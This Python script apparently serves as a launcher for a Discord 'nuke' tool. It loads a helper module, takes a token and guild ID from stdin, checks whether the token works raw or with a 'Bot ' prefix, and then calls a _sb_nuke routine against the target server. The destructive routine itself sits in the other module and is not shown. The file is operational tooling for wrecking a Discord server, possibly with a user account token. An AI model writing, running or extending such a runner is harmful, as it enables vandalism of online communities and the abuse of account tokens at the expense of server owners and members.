#!/usr/bin/env python3
import sys
import json
import time
import os
import importlib.util

# Robust import of main_Version5 by searching multiple candidate locations.
# Looks in (in order): env MAIN_PY_PATH, same dir as this script, parent dir, current working dir, /home/container/main_Version5.py

def find_candidate_paths():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    cwd = os.getcwd()
    candidates = []
    env_path = os.getenv('MAIN_PY_PATH')
    if env_path:
        candidates.append(env_path)
    candidates += [
        os.path.join(script_dir, 'main_Version5.py'),
        os.path.join(os.path.dirname(script_dir), 'main_Version5.py'),
        os.path.join(cwd, 'main_Version5.py'),
        '/home/container/main_Version5.py',
    ]
    # remove duplicates while preserving order
    seen = set(); out = []
    for p in candidates:
        if not p: continue
        if p in seen: continue
        seen.add(p); out.append(p)
    return out


def load_main_module():
    for candidate in find_candidate_paths():
        try:
            if os.path.isfile(candidate):
                spec = importlib.util.spec_from_file_location('main_Version5', candidate)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                print(f"Loaded main_Version5 from {candidate}", flush=True)
                return module
        except Exception as e:
            print(f"Error loading candidate {candidate}: {e}", flush=True)
            continue
    # fallback to normal import
    try:
        import main_Version5 as m
        print("Imported main_Version5 via normal import", flush=True)
        return m
    except Exception:
        raise ImportError(f"Could not find main_Version5.py in candidates: {find_candidate_paths()}")

m = load_main_module()

# Read JSON config from stdin
try:
    cfg = json.load(sys.stdin)
except Exception:
    print('ERROR: no config provided', flush=True)
    sys.exit(1)

orig_token = cfg.get('token')
guild_id = cfg.get('guild_id')
user_cfg = cfg.get('cfg') or {}

# reply callback prints to stdout
def reply(msg):
    print(msg, flush=True)

# Normalize token: try raw token, then try with "Bot " prefix if raw fails
def normalize_token(token):
    if not token:
        return token
    try:
        me = m.get_me(token)
        if me and isinstance(me, dict) and me.get('id'):
            print('Token works as provided', flush=True)
            return token
    except Exception as e:
        print(f'Raw token check failed: {e}', flush=True)
    bot_token = token if token.startswith('Bot ') else f'Bot {token}'
    try:
        me = m.get_me(bot_token)
        if me and isinstance(me, dict) and me.get('id'):
            print('Token works when prefixed with "Bot "', flush=True)
            return bot_token
    except Exception as e:
        print(f'Bot-prefixed token check failed: {e}', flush=True)
    print('Warning: token normalization could not verify token; proceeding with original token', flush=True)
    return token

normalized = normalize_token(orig_token)

print(f"Starting NUKE runner for guild {guild_id}", flush=True)
try:
    m._sb_nuke(normalized, guild_id, reply, user_cfg)
    print('NUKE runner finished', flush=True)
except Exception as e:
    print('Error during nuke:', e, flush=True)
